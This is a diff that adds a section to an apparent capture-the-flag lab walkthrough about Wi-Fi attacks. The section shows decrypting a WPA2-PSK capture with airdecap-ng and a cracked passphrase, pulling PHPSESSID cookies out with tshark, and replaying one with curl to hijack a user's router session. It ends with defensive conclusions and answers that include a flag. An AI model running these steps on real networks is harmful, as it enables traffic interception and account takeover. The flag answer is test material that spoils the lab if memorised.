@@ -697,4 +697,77 @@ The flag on Home-2G is held by the accounts test1 and test2, whose passwords are
 
 The attack is therefore the one already run in Task 3. What differs is that those frames were cleartext and these are not, so a decryption stage sits between the capture and the extraction, and nothing after it changes. 
 
+**Decrypting With airdecap-ng**  
+
+The capture now holds both halves of what decryption needs, the handshake that establishes each client's key and the data frames that key protects. airdecap-ng takes the passphrase and the network name, rederives the PMK, locates each handshake in the file to rebuild that client's PTK, and writes out a second capture with the CCMP layer stripped away:  
+
+```console
+user@debian-thm:~$ sudo airdecap-ng -e Home-2G -p <passphrase> home2g-http-01.cap
+Total number of stations seen            4
+Total number of packets read          6431
+Total number of WEP data packets         0
+Total number of WPA data packets       369
+Number of plaintext data packets         0
+Number of decrypted WEP  packets         0
+Number of corrupted WEP  packets         0
+Number of decrypted WPA  packets       254
+Number of bad TKIP (WPA) packets         0
+Number of bad CCMP (WPA) packets         0
+```
+
+airdecap-ng reads the saved file rather than the air, so the radio plays no further part. -e Home-2G supplies the ESSID (Extended Service Set Identifier), the advertised network name, which matters because the PMK derives from the passphrase and the name together. -p supplies the passphrase recovered in Task 6.  
+
+A non-zero Number of decrypted WPA packets confirms the handshakes were matched and the PTKs rebuilt. The output is written to home2g-http-01-dec.cap, leaving the original untouched, and the frames it contains are ordinary Ethernet rather than 802.11, so they read like any wired capture.  
+
+**Extracting and Replaying the Cookies**  
+
+Reading the decrypted file is the Task 3 extraction unchanged, with only the file named differing, since the original capture still holds nothing but ciphertext:  
+
+```console
+user@debian-thm:~$ sudo tshark -r home2g-http-01-dec.cap -Y http.cookie -T fields -e ip.src -e http.cookie
+192.168.2.8	PHPSESSID=REDACTED-1
+192.168.2.8	PHPSESSID=REDACTED-2
+192.168.2.8	PHPSESSID=REDACTED-1
+192.168.2.8	PHPSESSID=REDACTED-2
+```
+
+Two distinct PHPSESSID values come back, both sent from 192.168.2.8, so the capture holds two separate sessions rather than one repeated. Both users' requests happen to leave over that one station here, which is why the handshake from each was worth capturing rather than guessing at. Captured values will differ from the example, and so will the number of rows, since each row is one request the capture happened to catch. Run the replay from wlan1, associated in the previous task, since 192.168.2.1 is reachable only from inside the WPA2 network. As on the open network, -b presents the stolen session and the panel serves whichever account that PHPSESSID belongs to:  
+
+```console
+user@debian-thm:~$ curl -s -b "PHPSESSID=REDACTED-1" http://192.168.2.1/index.php
+```
+
+```console
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WiFi Router Configuration</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+...
+Welcome test1<br><br>Flag: <button onclick="copyFlagToClipboard('THM{REDACTED}')">THM{REDACTED}</button><br><br><br><br>Congratulation! You have logged into password protected page. 
+<a href="logout.php">Click here</a> to Logout.
+```
+
+**The Two Attacks Compared**  
+
+On the open network the sequence was capture, tshark, replay. On WPA2-PSK it is capture, airdecap-ng, tshark, replay. That inserted step was possible only because the passphrase had been cracked.  
+
+<img width="2200" height="756" alt="image" src="https://github.com/user-attachments/assets/6a14a452-5e61-45eb-a1a8-014329fe65a0" />
+
+Two conclusions follow. Structurally, every WPA2-PSK device shares one passphrase, so anyone holding it can decrypt any other user's traffic. Per-user keys, which enterprise Wi-Fi provides, close that gap. Separately, the router served its login over plain HTTP, so removing the WPA2 layer exposed the cookie. Had the panel used HTTPS, decryption would have revealed only TLS ciphertext. Wireless encryption and transport encryption defend against different attackers, and this network deployed only one.  
+
+**Answer the questions below**  
+
+**Which tool from the aircrack-ng suite decrypts a WPA2 capture when you supply the passphrase?**  
+*Answer:* airdecap-ng  
+
+**What is the name of the session cookie stolen from the decrypted HTTP traffic?**  
+*Answer:* PHPSESSID   
+
+**What is the flag retrieved from the WPA2-PSK network?**  
+
+*Answer:* THM{9f863bbec27bd00458dfa5f84fe3a81f1f688955}  
+
 
